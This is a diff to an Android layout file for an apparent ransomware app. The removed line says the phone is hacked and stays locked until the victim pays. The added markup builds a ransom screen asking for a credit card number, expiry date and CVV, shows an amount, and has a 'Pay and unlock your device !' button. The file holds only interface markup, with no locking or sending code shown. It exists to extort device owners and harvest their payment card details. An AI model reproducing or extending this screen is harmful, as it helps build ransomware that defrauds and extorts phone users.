@@ -1,5 +1,5 @@
 <?xml version="1.0" encoding="utf-8"?>
-<android.support.constraint.ConstraintLayout xmlns:android="http://schemas.android.com/apk/res/android"
+<RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android"
     xmlns:app="http://schemas.android.com/apk/res-auto"
     xmlns:tools="http://schemas.android.com/tools"
     android:layout_width="match_parent"
@@ -9,10 +9,124 @@
     <TextView
         android:layout_width="wrap_content"
         android:layout_height="wrap_content"
-        android:text="You have Been hacked ! hahaha, Pay me or your phone will remain lock forever !"
+        android:text="@string/device_lock_message"
         app:layout_constraintBottom_toBottomOf="parent"
         app:layout_constraintLeft_toLeftOf="parent"
         app:layout_constraintRight_toRightOf="parent"
-        app:layout_constraintTop_toTopOf="parent" />
+        app:layout_constraintTop_toTopOf="parent"
+        app:layout_constraintHorizontal_bias="0.511"
+        app:layout_constraintVertical_bias="0.033"
+        android:id="@+id/textView"
+        android:layout_alignParentTop="true"
+        android:layout_centerHorizontal="true" />
+    <TextView
+        android:layout_width="133dp"
+        android:layout_height="19dp"
+        android:text="Credit Card Number:"
+        android:id="@+id/credeit_card_label"
+        app:layout_constraintBottom_toBottomOf="parent"
+        app:layout_constraintLeft_toLeftOf="parent"
+        app:layout_constraintRight_toRightOf="parent"
+        app:layout_constraintTop_toTopOf="parent"
+        app:layout_constraintHorizontal_bias="0.115"
+        app:layout_constraintVertical_bias="0.156"
+        android:layout_below="@+id/textView"
+        android:layout_alignParentStart="true"
+        android:layout_marginStart="13dp"
+        android:layout_marginTop="21dp" />
 
-</android.support.constraint.ConstraintLayout>
+    <EditText
+        android:id="@+id/credit_card_field"
+        android:layout_width="wrap_content"
+        android:layout_height="40dp"
+        android:ems="10"
+        android:inputType="numberPassword"
+        android:layout_below="@+id/credeit_card_label"
+        android:layout_alignStart="@+id/credeit_card_label" />
+    <TextView
+        android:layout_width="100dp"
+        android:layout_height="20dp"
+        android:text="Expiration Date:"
+        android:layout_marginTop="13dp"
+        android:layout_below="@+id/credit_card_field"
+        android:layout_alignStart="@+id/credit_card_field"
+        android:id="@+id/expiration_date_label" />
+    <TextView
+        android:id="@+id/month_label"
+        android:layout_width="50dp"
+        android:layout_height="20dp"
+        android:text="Month"
+        android:layout_marginTop="27dp"
+        android:layout_below="@+id/expiration_date_label"
+        android:layout_alignStart="@+id/expiration_date_label" />
+    <EditText
+        android:layout_width="50dp"
+        android:layout_height="40dp"
+        android:id="@+id/month_field"
+        android:inputType="number"
+        android:layout_alignBaseline="@+id/month_label"
+        android:layout_alignBottom="@+id/month_label"
+        android:layout_toEndOf="@+id/amount_to_pay_label" />
+    <TextView
+        android:layout_width="30dp"
+        android:layout_height="20dp"
+        android:id="@+id/year_label"
+        android:text="Year"
+        android:layout_alignBaseline="@+id/month_field"
+        android:layout_alignBottom="@+id/month_field"
+        android:layout_toEndOf="@+id/credeit_card_label" />
+    <EditText
+        android:layout_width="30dp"
+        android:layout_height="40dp"
+        android:id="@+id/year_field"
+        android:layout_alignBaseline="@+id/year_label"
+        android:layout_alignBottom="@+id/year_label"
+        android:layout_toEndOf="@+id/year_label"
+        android:layout_marginStart="11dp" />
+    <TextView
+        android:layout_width="30dp"
+        android:layout_height="20dp"
+        android:id="@+id/cvv_label"
+        android:text="CVV"
+        android:layout_marginTop="29dp"
+        android:layout_below="@+id/month_field"
+        android:layout_alignStart="@+id/month_label" />
+    <EditText
+        android:layout_width="50dp"
+        android:layout_height="40dp"
+        android:id="@+id/cvv_field"
+        android:layout_alignBaseline="@+id/cvv_label"
+        android:layout_alignBottom="@+id/cvv_label"
+        android:layout_toStartOf="@+id/PayAndUnlockDevice" />
+    <TextView
+        android:layout_width="55dp"
+        android:layout_height="20dp"
+        android:id="@+id/amount_to_pay_label"
+        android:text="Amount:"
+        android:layout_marginTop="19dp"
+        android:layout_below="@+id/cvv_field"
+        android:layout_alignStart="@+id/cvv_label" />
+    <TextView
+        android:layout_width="60dp"
+        android:layout_height="20dp"
+        android:id="@+id/theAmount"
+        android:layout_alignBaseline="@+id/amount_to_pay_label"
+        android:layout_alignBottom="@+id/amount_to_pay_label"
+        android:layout_alignStart="@+id/month_field" />
+    <Button
+        android:layout_width="200dp"
+        android:layout_height="40dp"
+        android:id="@+id/PayAndUnlockDevice"
+        android:text="Pay and unlock your device !"
+        android:layout_marginTop="80dp"
+        android:layout_below="@+id/theAmount"
+        android:layout_centerHorizontal="true" />
+    <ProgressBar
+        android:layout_width="100dp"
+        android:layout_height="100dp"
+        android:id="@+id/progressBar"
+        android:layout_alignTop="@+id/cvv_field"
+        android:layout_alignStart="@+id/year_label" />
+
+
+</RelativeLayout>
